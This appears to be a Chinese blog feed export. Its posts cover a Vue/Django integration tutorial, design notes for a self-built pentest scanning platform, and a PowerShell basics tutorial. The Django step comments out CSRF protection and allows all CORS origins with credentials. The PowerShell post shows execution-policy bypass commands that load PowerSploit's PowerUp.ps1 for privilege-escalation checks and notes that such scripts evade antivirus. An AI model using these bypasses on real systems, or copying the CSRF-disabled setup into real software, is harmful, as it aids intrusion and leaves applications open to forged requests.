this.$http.get(&#x27;http://127.0.0.1:8000/api/add_student?student_name=&#x27; + this.input)</span><br><span class="line"> </span><br><span class="line">        .then((response) =&gt; &#123;</span><br><span class="line"> </span><br><span class="line">          var res = JSON.parse(response.bodyText)</span><br><span class="line"> </span><br><span class="line">          if (res.error_num === 0) &#123;</span><br><span class="line"> </span><br><span class="line">            this.showStudents()</span><br><span class="line"> </span><br><span class="line">          &#125; else &#123;</span><br><span class="line"> </span><br><span class="line">            this.$message.error(&#x27;新增学生失败，请重试&#x27;)</span><br><span class="line"> </span><br><span class="line">            console.log(res[&#x27;msg&#x27;])</span><br><span class="line"> </span><br><span class="line">          &#125;</span><br><span class="line"> </span><br><span class="line">        &#125;)</span><br><span class="line"> </span><br><span class="line">    &#125;,</span><br><span class="line"> </span><br><span class="line">    showStudents () &#123;</span><br><span class="line"> </span><br><span class="line">      this.$http.get(&#x27;http://127.0.0.1:8000/api/show_students&#x27;)</span><br><span class="line"> </span><br><span class="line">        .then((response) =&gt; &#123;</span><br><span class="line"> </span><br><span class="line">          var res = JSON.parse(response.bodyText)</span><br><span class="line"> </span><br><span class="line">          console.log(res)</span><br><span class="line"> </span><br><span class="line">          if (res.error_num === 0) &#123;</span><br><span class="line"> </span><br><span class="line">            this.studentList = res[&#x27;list&#x27;]</span><br><span class="line"> </span><br><span class="line">            console.log(this.studentList)</span><br><span class="line"> </span><br><span class="line">          &#125; else &#123;</span><br><span class="line"> </span><br><span class="line">            this.$message.error(&#x27;查询学生失败&#x27;)</span><br><span class="line"> </span><br><span class="line">            console.log(res[&#x27;msg&#x27;])</span><br><span class="line"> </span><br><span class="line">          &#125;</span><br><span class="line"> </span><br><span class="line">        &#125;)</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;/script&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;!-- Add &quot;scoped&quot; attribute to limit CSS to this component only --&gt;</span><br><span class="line"> </span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"> </span><br><span class="line">h1, h2 &#123;</span><br><span class="line"> </span><br><span class="line">  font-weight: normal;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">ul &#123;</span><br><span class="line"> </span><br><span class="line">  list-style-type: none;</span><br><span class="line"> </span><br><span class="line">  padding: 0;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">li &#123;</span><br><span class="line"> </span><br><span class="line">  display: inline-block;</span><br><span class="line"> </span><br><span class="line">  margin: 0 10px;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">a &#123;</span><br><span class="line"> </span><br><span class="line">  color: #42b983;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h3 id="6-配置路由"><a href="#6-配置路由" class="headerlink" title="6.配置路由"></a>6.配置路由</h3><p>ptvue&#x2F;router文件夹下的index.js中增加页面路由:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">HelloWorld</span> <span class="keyword">from</span> <span class="string">&#x27;@/components/HelloWorld&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Student</span> <span class="keyword">from</span> <span class="string">&#x27;@/components/Student&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Router</span> <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Router</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Router</span>(&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="attr">routes</span>: [&#123;</span><br><span class="line"> </span><br><span class="line">                <span class="attr">path</span>: <span class="string">&#x27;/HelloWorld&#x27;</span>,</span><br><span class="line"> </span><br><span class="line">                <span class="attr">name</span>: <span class="string">&#x27;HelloWorld&#x27;</span>,</span><br><span class="line"> </span><br><span class="line">                <span class="attr">component</span>: <span class="title class_">HelloWorld</span></span><br><span class="line"> </span><br><span class="line">            &#125;,</span><br><span class="line"> </span><br><span class="line">            &#123;</span><br><span class="line"> </span><br><span class="line">                <span class="attr">path</span>: <span class="string">&#x27;/student&#x27;</span>,</span><br><span class="line"> </span><br><span class="line">                <span class="attr">name</span>: <span class="string">&#x27;Student&#x27;</span>,</span><br><span class="line"> </span><br><span class="line">                <span class="attr">component</span>: <span class="title class_">Student</span></span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        ]</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// eslint-disable-next-line eol-last</span></span><br><span class="line"> </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>ptvue文件夹下的main.js中引入ElementUI并注册:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// The Vue build version to load with the `import` command</span><br><span class="line"> </span><br><span class="line">// (runtime-only or standalone) has been set in webpack.base.conf with an alias.</span><br><span class="line"> </span><br><span class="line">import &#x27;default-passive-events&#x27;</span><br><span class="line"> </span><br><span class="line">import ElementUI from &#x27;element-ui&#x27;</span><br><span class="line"> </span><br><span class="line">import Vue from &#x27;vue&#x27;</span><br><span class="line"> </span><br><span class="line">// 引入vue-resource</span><br><span class="line"> </span><br><span class="line">import VueResource from &#x27;vue-resource&#x27;</span><br><span class="line"> </span><br><span class="line">// 注册ElementUI组件</span><br><span class="line"> </span><br><span class="line">import &#x27;../node_modules/element-ui/lib/theme-chalk/index.css&#x27;</span><br><span class="line"> </span><br><span class="line">import App from &#x27;./App&#x27;</span><br><span class="line"> </span><br><span class="line">import router from &#x27;./router&#x27;</span><br><span class="line"> </span><br><span class="line">Vue.config.productionTip = false</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">// 注册ElementUI组件</span><br><span class="line"> </span><br><span class="line">Vue.use(ElementUI)</span><br><span class="line"> </span><br><span class="line">// 注册VueResource</span><br><span class="line"> </span><br><span class="line">Vue.use(VueResource)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* eslint-disable no-new */</span><br><span class="line"> </span><br><span class="line">new Vue(&#123;</span><br><span class="line"> </span><br><span class="line">    el: &#x27;#app&#x27;,</span><br><span class="line"> </span><br><span class="line">    router,</span><br><span class="line"> </span><br><span class="line">    components: &#123; App &#125;,</span><br><span class="line"> </span><br><span class="line">    template: &#x27;&lt;App/&gt;&#x27;</span><br><span class="line"> </span><br><span class="line">        // eslint-disable-next-line eol-last</span><br><span class="line"> </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="🔗三、整合"><a href="#🔗三、整合" class="headerlink" title="🔗三、整合"></a>🔗三、整合</h2><h3 id="1-前端vue项目调用后端引入vue-resource"><a href="#1-前端vue项目调用后端引入vue-resource" class="headerlink" title="1.前端vue项目调用后端引入vue-resource"></a>1.前端vue项目调用后端引入vue-resource</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install vue-resource --save</span><br></pre></td></tr></table></figure>

<h3 id="2-解决跨域问题"><a href="#2-解决跨域问题" class="headerlink" title="2.解决跨域问题"></a>2.解决跨域问题</h3><p>在Django层注入header，安装django-cors-headers：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m pip install django-cors-headers</span><br></pre></td></tr></table></figure>

<p>修改 settings.py:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">    &#x27;InfoScan&#x27;,</span><br><span class="line">    &#x27;corsheaders&#x27;,              # 解决跨域</span><br><span class="line">    &#x27;django.contrib.admin&#x27;,</span><br><span class="line">    ...</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>在MIDDLEWARE_CLASSES添加 ‘corsheaders.middleware.CorsMiddleware’， 同时把csrf的中间件注释掉</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MIDDLEWARE = [</span><br><span class="line">    &#x27;django.middleware.security.SecurityMiddleware&#x27;,</span><br><span class="line">    &#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.common.CommonMiddleware&#x27;,</span><br><span class="line">    # &#x27;django.middleware.csrf.CsrfViewMiddleware&#x27;,</span><br><span class="line">    &#x27;corsheaders.middleware.CorsMiddleware&#x27;,                    # 解决跨域</span><br><span class="line">    &#x27;django.contrib.auth.middleware.AuthenticationMiddleware&#x27;,</span><br><span class="line">    &#x27;django.contrib.messages.middleware.MessageMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.clickjacking.XFrameOptionsMiddleware&#x27;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>继续添加如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CORS_ALLOW_CREDENTIALS = True</span><br><span class="line">CORS_ORIGIN_ALLOW_ALL = True</span><br></pre></td></tr></table></figure>

<h3 id="3-增加Django路由"><a href="#3-增加Django路由" class="headerlink" title="3.增加Django路由"></a>3.增加Django路由</h3><p>修改settings.py,指向vue项目下的静态资源 dist：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TEMPLATES = [</span><br><span class="line">    &#123;</span><br><span class="line">        &#x27;BACKEND&#x27;: &#x27;django.template.backends.django.DjangoTemplates&#x27;,</span><br><span class="line">        &#x27;DIRS&#x27;: [&#x27;Ptvue/dist&#x27;],</span><br><span class="line">        &#x27;APP_DIRS&#x27;: True,</span><br><span class="line">        &#x27;OPTIONS&#x27;: &#123;</span><br><span class="line">            &#x27;context_processors&#x27;: [</span><br><span class="line">                ...</span><br><span class="line">            ],</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>继续添加静态文件路径：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">STATICFILES_DIRS = [</span><br><span class="line">    os.path.join(BASE_DIR, &#x27;Ptvue/dist/static&#x27;)</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h3 id="4-重新打包和运行项目"><a href="#4-重新打包和运行项目" class="headerlink" title="4.重新打包和运行项目"></a>4.重新打包和运行项目</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm run build</span><br><span class="line">python manage.py runserver</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/PentestWeb%E5%BC%80%E5%8F%91(%E4%B8%80)/image-20220613215233337.png" alt="image-20220613215233337"></p>
<h2 id="💡四、参考链接"><a href="#💡四、参考链接" class="headerlink" title="💡四、参考链接"></a>💡四、参考链接</h2><p><a href="https://www.jb51.net/article/167473.htm">https://www.jb51.net/article/167473.htm</a></p>
<p><a href="https://blog.csdn.net/weixin_42557538/article/details/121017085">https://blog.csdn.net/weixin_42557538/article/details/121017085</a></p>
<p><a href="https://blog.csdn.net/qq_40722582/article/details/113826647">https://blog.csdn.net/qq_40722582/article/details/113826647</a></p>
]]></content>
      <categories>
        <category>编程随想</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>各项功能的实现方案和设想 day3</title>
    <url>/posts/194da69d.html</url>
    <content><![CDATA[<h1 id="day3"><a href="#day3" class="headerlink" title="day3"></a>day3</h1><h2 id="日志模块"><a href="#日志模块" class="headerlink" title="日志模块"></a>日志模块</h2><p>logger 模块</p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>端口解决的方案：</p>
<p><a href="https://mp.weixin.qq.com/s/6G6lO-dOA4LV637mPMzBQA">https://mp.weixin.qq.com/s/6G6lO-dOA4LV637mPMzBQA</a></p>
<h2 id="代理扫描"><a href="#代理扫描" class="headerlink" title="代理扫描"></a>代理扫描</h2><p>代理的搜集：<a href="https://mp.weixin.qq.com/s/cmfc_whg9AZMuWsb0uqy-Q">https://mp.weixin.qq.com/s/cmfc_whg9AZMuWsb0uqy-Q</a></p>
<p>代理的收集和切换：<a href="https://mp.weixin.qq.com/s/xDWXvknsL9lqCNo3N5CQ1g">https://mp.weixin.qq.com/s/xDWXvknsL9lqCNo3N5CQ1g</a></p>
<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><h2 id="插件开发"><a href="#插件开发" class="headerlink" title="插件开发"></a>插件开发</h2><p>密码生成：<a href="https://github.com/ort4u/PwdBUD">https://github.com/ort4u/PwdBUD</a></p>
<p>密码爆破：webcrack</p>
<h2 id="辅助模块"><a href="#辅助模块" class="headerlink" title="辅助模块"></a>辅助模块</h2>]]></content>
      <categories>
        <category>编程随想</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>PenKitWeb逻辑流程 day4</title>
    <url>/posts/8a10d613.html</url>
    <content><![CDATA[<h2 id="主流程"><a href="#主流程" class="headerlink" title="主流程"></a>主流程</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/PentestWeb%E5%BC%80%E5%8F%91(%E5%9B%9B)/image-20220703141607967.png" alt="image-20220703141607967"></p>
]]></content>
      <categories>
        <category>编程随想</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>PentestWeb 数据库设计 day2</title>
    <url>/posts/42334200.html</url>
    <content><![CDATA[<h1 id="day2"><a href="#day2" class="headerlink" title="day2"></a>day2</h1><h2 id="📌前言"><a href="#📌前言" class="headerlink" title="📌前言"></a>📌前言</h2><p>设计一个好的数据库是至关重要的。PentestWeb 如果想要优秀的拓展性、可用性、健壮性，就要从数据库开始，打好一个良好的基础。</p>
<p>我会用大部分且漫长的时间去完善这个数据库。</p>
<h2 id="💡数据库设计"><a href="#💡数据库设计" class="headerlink" title="💡数据库设计"></a>💡数据库设计</h2><h3 id="1-扫描任务表"><a href="#1-扫描任务表" class="headerlink" title="1.扫描任务表"></a>1.扫描任务表</h3><p>输入目标，可能是单个目标，也可能是多个目标，如果是多个目标，就要把它的每个url&#x2F;host根据 &#x2F;n 分开，使用任务名称 name 作为主键，每次要进行的扫描会生成一个任务。</p>
<p><strong>Task</strong></p>
<table>
<thead>
<tr>
<th>字段</th>
<th>字段类型</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>name</td>
<td>CharField,50,</td>
<td>主键，任务名称</td>
</tr>
<tr>
<td>note</td>
<td>CharField,500,blank</td>
<td>任务说明</td>
</tr>
<tr>
<td>targets</td>
<td>TextField,</td>
<td>输入的目标</td>
</tr>
<tr>
<td>ports</td>
<td>TextField，</td>
<td>输入的端口</td>
</tr>
<tr>
<td>is_icp</td>
<td>BooleanField，default&#x3D;false</td>
<td>是否查询icp备案</td>
</tr>
<tr>
<td>is_proxy</td>
<td>BooleanField，default&#x3D;false</td>
<td>是否开启代理进行扫描，</td>
</tr>
<tr>
<td>is_vul</td>
<td>BooleanField，default&#x3D;false</td>
<td>是否进行漏洞扫描</td>
</tr>
<tr>
<td>is_awvs</td>
<td>BooleanField，default&#x3D;false</td>
<td>是否进行awvs扫描</td>
</tr>
<tr>
<td>is_plug</td>
<td>BooleanField，default&#x3D;false</td>
<td>是否启用插件</td>
</tr>
<tr>
<td>plug_name</td>
<td>CharField,ForeignKey,500,blank</td>
<td>外键，启用的插件，关联插件表</td>
</tr>
<tr>
<td>status</td>
<td>CharField,choices</td>
<td>扫描任务状态，等待中，进行中，已完成</td>
</tr>
<tr>
<td>created_time</td>
<td>DateTimeField</td>
<td>创建时间</td>
</tr>
</tbody></table>
<h3 id="2-扫描结果表"><a href="#2-扫描结果表" class="headerlink" title="2.扫描结果表"></a>2.扫描结果表</h3><p>扫描结果表是扫描任务表的进一步处理化，加入开放的端口，删除未开放的端口，添加有效的url&#x2F;host、备案信息，后台url，指纹识别结果，target格式为：protocol:&#x2F;&#x2F;hostname[:port]&#x2F;path，</p>
<p><strong>Result</strong></p>
<table>
<thead>
<tr>
<th>字段</th>
<th>字段类型</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>primary_key,AutoField,int,11</td>
<td>主键，自动生成</td>
</tr>
<tr>
<td>name</td>
<td>CharField,ForeignKey,50,</td>
<td>外键，扫描任务的名称，关联扫描任务表</td>
</tr>
<tr>
<td>target</td>
<td>ForeignKey,CharField,500</td>
<td>有效资源</td>
</tr>
<tr>
<td>critical_vul_count</td>
<td>PositiveIntegerField</td>
<td>严重的漏洞数量</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>icp</td>
<td>TextField，</td>
<td>所有icp备案查询信息</td>
</tr>
</tbody></table>
<h3 id="3-target详情表"><a href="#3-target详情表" class="headerlink" title="3.target详情表"></a>3.target详情表</h3><p><strong>Target</strong></p>
<table>
<thead>
<tr>
<th>字段</th>
<th>字段类型</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>target</td>
<td>primary_key,CharField,500</td>
<td>主键</td>
</tr>
<tr>
<td>ip</td>
<td>CharField,50</td>
<td>ip地址</td>
</tr>
<tr>
<td>is_cdn</td>
<td>BooleanField，default&#x3D;false</td>
<td>是否使用cdn</td>
</tr>
<tr>
<td>protocol</td>
<td>CharField,50</td>
<td>target使用的协议</td>
</tr>
<tr>
<td>hostname</td>
<td>CharField,50</td>
<td>target的主机名称</td>
</tr>
<tr>
<td>port</td>
<td>PositiveIntegerField</td>
<td>target的端口</td>
</tr>
<tr>
<td>status</td>
<td>CharField,</td>
<td>状态码，200，404 等等</td>
</tr>
<tr>
<td>js_info</td>
<td>TextField</td>
<td>js文件泄露的信息</td>
</tr>
<tr>
<td>back_url</td>
<td>CharField,blank&#x3D;true</td>
<td>目标是否存在后台url</td>
</tr>
<tr>
<td>is_webpack</td>
<td>BooleanField，default&#x3D;false</td>
<td>是否为webpack打包，如果是，则可以使用packerfuzz扫描</td>
</tr>
</tbody></table>
<h3 id="4-插件表"><a href="#4-插件表" class="headerlink" title="4.插件表"></a>4.插件表</h3><p>一个可持续发展的系统，必须要有插件功能，这是该系统十分重要的一部分功能。如果想要增加插件的配置，先到配置表添加，插件中再引用配置表的配置。具体引用方式为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Config import setting.fofa_key</span><br></pre></td></tr></table></figure>

<p><strong>Plug</strong></p>
<table>
<thead>
<tr>
<th>字段</th>
<th>字段类型</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>plug_name</td>
<td>primary_key,CharField,50</td>
<td>主键</td>
</tr>
<tr>
<td>path</td>
<td>CharField,100</td>
<td>插件存放的路径，如： ..&#x2F;for.py</td>
</tr>
<tr>
<td>config_name</td>
<td>CharField,ForeignKey，500,</td>
<td>外键，关联配置表</td>
</tr>
</tbody></table>
<h3 id="5-用户表"><a href="#5-用户表" class="headerlink" title="5.用户表"></a>5.用户表</h3><p><strong>用户表</strong></p>
<p>还需要设置免登录功能。可以参考那个项目。</p>
<p>管理员可以添加用户，使用全部功能。</p>
<p>用户可以使用全部功能，但不能添加用户。</p>
<p>游客可以使用部分开放功能，服务不全。</p>
<p><strong>User</strong></p>
<table>
<thead>
<tr>
<th>字段</th>
<th>字段类型</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>username</td>
<td>primary_key,CharField,50</td>
<td>主键，用户名</td>
</tr>
<tr>
<td>password</td>
<td>CharField,50</td>
<td>密码</td>
</tr>
<tr>
<td>email</td>
<td>EmailField,blank</td>
<td>邮箱，任务扫描完成后发送邮箱提醒，重置密码链接</td>
</tr>
<tr>
<td>role</td>
<td>CharField,choices</td>
<td>用户权限等级,管理员，用户，游客，</td>
</tr>
<tr>
<td>profile</td>
<td>ImageField</td>
<td>用户头像</td>
</tr>
<tr>
<td>config_name</td>
<td>CharField,ForeignKey，500,</td>
<td>外键，用户配置，关联配置表</td>
</tr>
</tbody></table>
<h3 id="6-配置表"><a href="#6-配置表" class="headerlink" title="6.配置表"></a>6.配置表</h3><p>配置表，主要作用是存储每个用户配置的信息，后期可自行添加想要配置的字段。</p>
<p><strong>Config</strong></p>
<table>
<thead>
<tr>
<th>字段</th>
<th>字段类型</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>config_name</td>
<td>primary_key</td>
<td>主键，配置表</td>
</tr>
<tr>
<td>username</td>
<td>CharField,ForeignKey,50,</td>
<td>配置所属用户，外键，关联用户表</td>
</tr>
<tr>
<td>fofa_key</td>
<td>CharField,500</td>
<td>fofa密钥</td>
</tr>
<tr>
<td>awvs_ip</td>
<td>CharField,500</td>
<td>awvs ip</td>
</tr>
<tr>
<td>awvs_key</td>
<td>CharField,500</td>
<td>awvs key</td>
</tr>
</tbody></table>
<h3 id="7-每日一句话表"><a href="#7-每日一句话表" class="headerlink" title="7.每日一句话表"></a>7.每日一句话表</h3><p><strong>Everyday</strong></p>
<table>
<thead>
<tr>
<th>字段</th>
<th>字段类型</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>content</td>
<td>CharField</td>
<td>内容</td>
</tr>
<tr>
<td>weight</td>
<td>CharField,choices</td>
<td>权重</td>
</tr>
<tr>
<td>status</td>
<td>CharField,choices</td>
<td>状态，展示和不展示</td>
</tr>
</tbody></table>
<h3 id="8-字典"><a href="#8-字典" class="headerlink" title="8.字典"></a>8.字典</h3><p><strong>Dict</strong></p>
<p>参考文件上传方案。</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>字段类型</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>file</td>
<td>FileField,</td>
<td>字典名称</td>
</tr>
<tr>
<td>created_time</td>
<td>TimeField</td>
<td>创建时间</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>编程随想</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>PowerShell 基础教程</title>
    <url>/posts/154b62c.html</url>
    <content><![CDATA[<h1 id="Window-PowerShell-基础"><a href="#Window-PowerShell-基础" class="headerlink" title="Window PowerShell 基础"></a>Window PowerShell 基础</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Window PowerShell 是一种命令行外壳程序和脚本环境，内置在 Windows 版本中（Win7、Windows server 2008 R2及更高版本），需要 .NET 环境支持，同时支持 .NET 对象，其可读性、可用性居于所有 Shell 之首。</p>
<p><strong>特点：</strong></p>
<ul>
<li>win7 以上版本默认安装</li>
<li>脚本可在内存中运行，不需要写入磁盘</li>
<li>几乎不会触发杀毒软件</li>
<li>可以远程执行</li>
<li>目前很多工具基于 PowerShell 开发</li>
<li>使 Windows 脚本执行变得更加容易</li>
<li>可用于管理活动目录</li>
</ul>
<p><strong>版本对照：</strong></p>
<table>
<thead>
<tr>
<th align="center">操作系统</th>
<th align="center">PowerShell版本</th>
<th align="center">是否可升级</th>
</tr>
</thead>
<tbody><tr>
<td align="center">win7&#x2F;win server 2008</td>
<td align="center">2.0</td>
<td align="center">可升级为3.0、4.0</td>
</tr>
<tr>
<td align="center">win8&#x2F;win server 2012</td>
<td align="center">3.0</td>
<td align="center">可升级为4.0</td>
</tr>
<tr>
<td align="center">win8&#x2F;win server 2012 R2</td>
<td align="center">4.0</td>
<td align="center">否</td>
</tr>
</tbody></table>
<p><strong>查看 PowerShell 版本</strong></p>
<p><code>Get-Host</code> 或者 <code>$PSVersionTable.PSVersion</code></p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/PowerShell基础教程/image-20210925110855476.png" alt="image-20210925110855476" style="zoom:50%;" />

<h2 id="PowerShell-基础概念"><a href="#PowerShell-基础概念" class="headerlink" title="PowerShell 基础概念"></a>PowerShell 基础概念</h2><h3 id="1-ps1-文件"><a href="#1-ps1-文件" class="headerlink" title="1.  .ps1 文件"></a>1.  .ps1 文件</h3><p>PowerShell 脚本的文件扩展名为 <code>.ps1</code> 。PowerShell 脚本文件中包含一系列 PS 命令，每个命令显示为独立的一行。</p>
<h3 id="2-执行策略"><a href="#2-执行策略" class="headerlink" title="2. 执行策略"></a>2. 执行策略</h3><p>为了防止使用者执行恶意脚本，PS 提供了一个执行策略。默认情况下，这个执行策略被设置为 “不能运行”。</p>
<p>如果 PS 脚本无法运行，可以使用下面的 <a href="https://blog.csdn.net/culunxun2863/article/details/108840523">cmdlet</a> 命令查询当前的执行策略：</p>
<p><code>Get-ExecutionPolicy</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/PowerShell%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20210925111557145.png" alt="image-20210925111557145"></p>
<ul>
<li>Restricted：脚本不能运行（默认设置）</li>
<li>RemoteSigned：在本地创建的脚本可以运行，但从网上下载的脚本不能运行（拥有数字证书签名的除外）</li>
<li>AllSigned：仅当脚本由受信任的发布者签名时才能运行。</li>
<li>Unrestricted：允许所有脚本运行。</li>
</ul>
<p>可以使用下面的 cmdlet 命令设置 PS 的执行策略：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ExecutionPolicy &lt;policy name&gt;</span><br></pre></td></tr></table></figure>

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/PowerShell基础教程/image-20210925112408963.png" alt="image-20210925112408963" style="zoom:50%;" />

<h3 id="3-运行脚本"><a href="#3-运行脚本" class="headerlink" title="3. 运行脚本"></a>3. 运行脚本</h3><p>要运行一个 PS 脚本，必须输入路径名（绝对路径或相对路径）和文件名。</p>
<h3 id="4-管道"><a href="#4-管道" class="headerlink" title="4. 管道"></a>4. 管道</h3><p>管道的作用是将一个命令的输出作为另一个命令的输入，两个命令之间用 <code>|</code> 连接。</p>
<p>下面这个命令的意思是让正在运行的、名字以字符 <code>p</code> 开头的程序停止运行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-Process p* | Stop-Process</span><br></pre></td></tr></table></figure>

<h2 id="PowerShell-的常用命令"><a href="#PowerShell-的常用命令" class="headerlink" title="PowerShell 的常用命令"></a>PowerShell 的常用命令</h2><h3 id="1-基本知识"><a href="#1-基本知识" class="headerlink" title="1. 基本知识"></a>1. 基本知识</h3><p>在 PowerShell 中，类似 cmd 命令的命令叫作 cmdlet 命令。二者的命名规范一致，都采用 “动词-名词” 的形式，例如 “New-Item”。动词部分一般分为 Add、New、Get、Remove、Set 等。命令的别名一般兼容 windows command 和 Linux Shell，例如 <code>Get-ChildItem</code> 命令在 dir 和 ls 下均可使用。另外，PS 命令不区分大小写。</p>
<p><strong>基本用法：</strong></p>
<ul>
<li><p>新建目录：New-Item -Type Directory abc</p>
</li>
<li><p>新建文件：New-Item -Type File abc</p>
</li>
<li><p>删除目录：Remove-Item abc</p>
</li>
<li><p>显示文本内容：Get-Content .\spider.txt</p>
</li>
<li><p>设置文本内容：Set-Content .\spider.txt -Value “redisPy”</p>
</li>
<li><p>追加内容：Add-Content .\spider.txt -Value “flask”</p>
</li>
<li><p>清除内容：Clear-Content .\spider.txt</p>
</li>
</ul>
<h3 id="2-常用命令"><a href="#2-常用命令" class="headerlink" title="2. 常用命令"></a>2. 常用命令</h3><p>在 Windows 终端提示符下输入 “powershell” ，进入 PS 命令行环境。输入 “help” 命令即可显示帮助菜单。</p>
<blockquote>
<p>要运行 PS 脚本，必须使用管理员权限将策略从 Restricted 改成 Unrestricted。所以，需要进行绕过。</p>
</blockquote>
<p>（1）绕过本地权限并执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -File .\PowerUp.ps1</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/PowerShell%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20210925130657999.png" alt="绕过安全策略"></p>
<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">PowerUp.ps1</a>下载地址</p>
<p>powershell （管理员模式下反而没有成功）下可执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module d:\redteam\PowerUp.ps1; Invoke-AllChecks&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>cmd也通用。</p>
